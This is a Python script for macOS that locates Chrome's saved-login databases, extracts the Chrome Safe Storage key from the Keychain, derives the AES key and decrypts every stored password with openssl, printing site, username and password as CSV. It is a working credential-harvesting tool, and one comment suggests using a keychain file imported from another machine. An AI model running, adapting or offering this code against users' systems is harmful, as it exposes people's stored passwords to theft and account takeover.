import sqlite3, os, binascii, subprocess, base64, sys, hashlib, glob
from urllib.parse import urlparse


loginData = glob.glob("%s/Library/Application Support/Google/Chrome/Profile*/Login Data" % os.path.expanduser("~"))

if len(loginData) == 0:
    loginData = glob.glob("%s/Library/Application Support/Google/Chrome/Default/Login Data" % os.path.expanduser("~")) #attempt default profile

safeStorageKey = subprocess.check_output("security 2>&1 > /dev/null find-generic-password -ga 'Chrome' | awk '{print $2}'", shell=True).replace("\n", "").replace("\"", "")

if safeStorageKey == "":
    print("ERROR getting Chrome Safe Storage Key")
    #TODO: prompt user to "Copy Password to Clipboard" from MacOS' Keychain Access utility
    #(login-keychain.db from a different machine can be imported using Import Items, but RENAME IT FIRST!)
    sys.exit()

def chromeDecrypt(encrypted_value, iv, key=None): #AES decryption using the PBKDF2 key and 16x ' ' IV, via openSSL (installed on OSX natively)
    hexKey = bytes.hex(key)
    message_bytes = encrypted_value[3:]
    base64_bytes = base64.b64encode(message_bytes)
    base64_message = base64_bytes.decode('ascii')
    hexEncPassword = base64_message

    try: #send any error messages to /dev/null to prevent screen bloating up
        decrypted = subprocess.check_output("openssl enc -base64 -d -aes-128-cbc -iv '%s' -K %s <<< %s 2>/dev/null" % (iv, hexKey, hexEncPassword), shell=True).decode('ascii')
    except Exception as e:
        decrypted = ("ERROR retrieving password: %s" % e)
    return decrypted

def chromeProcess(safeStorageKey, loginData):
    iv = ''.join(('20',) * 16) #salt, iterations, iv, size - https://cs.chromium.org/chromium/src/components/os_crypt/os_crypt_mac.mm
    key = hashlib.pbkdf2_hmac('sha1', safeStorageKey, b'saltysalt', 1003)[:16]
    fd = os.open(loginData, os.O_RDONLY) #open as read only
    database = sqlite3.connect('/dev/fd/%d' % fd)
    os.close(fd)
    sql = 'select username_value, password_value, origin_url from logins'
    decryptedList = []
    with database:
        for user, encryptedPass, url in database.execute(sql):
            if user == "" or (encryptedPass[:3] != b'v10'): #user will be empty if they have selected "never" store password
                continue
            else:
                urlUserPassDecrypted = (url, user, chromeDecrypt(encryptedPass, iv, key=key))
                decryptedList.append(urlUserPassDecrypted)
    return decryptedList

for profile in loginData:
    print('name,url,username,password')
    for i, x in enumerate(chromeProcess(safeStorageKey, "%s" % profile)):
    	print("%s,%s,%s,%s" % (urlparse(x[0]).netloc, x[0], x[1], x[2]))
